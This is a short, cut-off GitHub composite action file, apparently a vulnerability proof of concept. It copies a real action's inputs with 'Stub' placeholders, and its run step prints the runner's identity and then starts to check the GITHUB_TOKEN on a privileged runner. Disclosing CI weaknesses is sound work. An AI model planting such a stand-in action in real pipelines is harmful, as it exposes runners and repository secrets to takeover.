  token:
    description: 'Stub'
    required: false
  ignore-events:
    description: 'Stub'
    required: false
  poll-interval:
    description: 'Stub'
    required: false

runs:
  using: "composite"
  steps:
    - run: |
        echo "========================================"
        echo "[!] VULNERABILITY DEMONSTRATED"
        echo "[!] Context: Privileged Runner"
        echo "[!] User: $(whoami)"
        echo "[!] ID: $(id)"
        echo "========================================"
        
        # Prove we have the token
        echo "[!] GITHUB_TOKEN status:"
